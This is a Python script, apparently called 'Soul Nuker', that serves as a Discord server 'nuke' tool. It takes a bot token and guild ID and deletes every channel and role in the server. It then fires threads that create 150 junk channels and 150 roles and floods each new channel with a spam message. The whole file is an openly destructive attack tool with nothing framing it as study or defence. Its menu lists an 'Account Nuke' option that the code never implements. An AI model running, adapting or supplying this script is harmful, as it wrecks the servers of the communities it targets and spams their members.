import sys
import requests
import threading
import httpx
import asyncio
import json
import random
import os
import time
import base64
import ctypes
import disnake
import discord
from discord.ext import commands
from colorama import Style, Fore
from disnake import Permissions


os.system("cls")
os.system('title Soul Nuker - Made By .exe#1567')



def check(token):
    return httpx.get("https://discord.com/api/v9/users/@me",headers = {'authorization':f"Bot {token}"}).status_code


def check_guild(guild,token):
    return httpx.get(f"https://discord.com/api/v9/guilds/{guild}",headers = {'authorization':f"Bot {token}"}).status_code


def check_token(token):
    return httpx.get("https://discord.com/api/v9/users/@me",headers = {'authorization':f"{token}"}).status_code





def nuke():
    token = input("Bot Token ")
    if check(token) in (200,201,204):
        guild = input("Guild ID ")
        if check_guild(guild,token) in (200,201,204):
            channel_name =input("Channel Name: ")
            spam_message = input("Message Spam: ")
            channels = httpx.get(f"https://discord.com/api/v9/guilds/{guild}/channels",headers = {"authorization": f"Bot {token}"}).json()
            roles = httpx.get(f"https://discord.com/api/v9/guilds/{guild}/roles",headers = {"authorization":f"Bot {token}"}).json()
            def delete_channels():
                httpx.delete(f"https://discord.com/api/v9/channels/{channel['id']}",headers={"authorization":f"Bot {token}"})
            def delete_roles():
                httpx.delete(f"https://discord.com/api/v9/guilds/{guild}/roles/{role['id']}",headers={"authorization":f"Bot {token}"})
            def create_channels():
                httpx.post(f"https://discord.com/api/v9/guilds/{guild}/channels",headers = {"authorization":f"Bot {token}"},json = {'name':channel_name})
            def create_roles():
                httpx.post(f"https://discord.com/api/v9/guilds/{guild}/roles",headers = {"authorization":f"Bot {token}"},json = {'name':channel_name,"color":random.randint(0,0xffffff)})
            
            def spam():
                httpx.post(f"https://discord.com/api/v9/channels/{chan['id']}/messages",headers = {"authorization":f"Bot {token}"},json = {'content':spam_message})

            for i in range(2):
             for channel in channels:
                try:
                 threading.Thread(target=delete_channels).start()
                except: pass
            for role in roles:
                    try: 
                        threading.Thread(target=delete_roles).start()
                    except: pass
            for i in range(150):
                threading.Thread(target=create_channels).start()
            for i in range(150):
                threading.Thread(target= create_roles).start()
            new_channels = httpx.get(f"https://discord.com/api/v9/guilds/{guild}/channels",headers = {"authorization": f"Bot {token}"}).json()
            for i in range(10):
             for chan in new_channels:
                    threading.Thread(target=spam).start()
            os.system("cls")
            menu()
        else: time.sleep(2);os.system("cls");menu()
    else: time.sleep(2);os.system("cls");menu()


def banner():
     print("""
  _   _           _                  
 | \ | |  _   _  | | __   ___   _ __ 
 |  \| | | | | | | |/ /  / _ \ | '__|
 | |\  | | |_| | |   <  |  __/ | |   
 |_| \_|  \__,_| |_|\_\  \___| |_|   
[1]Server Nuke
[2]Account Nuke
[3]Return To Menu                                     
                                    """)
def menu():
    banner()
    print("""
              
| \ | |  _   _  | | __   ___   _ __ 
|  \| | | | | | | |/ /  / _ \ | '__|
| |\  | | |_| | |   <  |  __/ | |   
|_| \_|  \__,_| |_|\_\  \___| |_|   
──────────────────────────────────────────────────────────────────────
[1]Server Nuke
[2]Account Nuke
[3]Return To Menu
──────────────────────────────────────────────────────────────────────""")
print("""
| \ | |  _   _  | | __   ___   _ __ 
|  \| | | | | | | |/ /  / _ \ | '__|
| |\  | | |_| | |   <  |  __/ | |   
|_| \_|  \__,_| |_|\_\  \___| |_|   
──────────────────────────────────────────────────────────────────────
[1]Server Nuke
[2]Exit
──────────────────────────────────────────────────────────────────────""")
choice = input("choice: ")

if choice == "1":
    os.system("cls")
    nuke()
else:
    os.system("cls")
    menu()
if choice == "2":
    os.system("cls")
    os._exit(0)

menu()














  




  






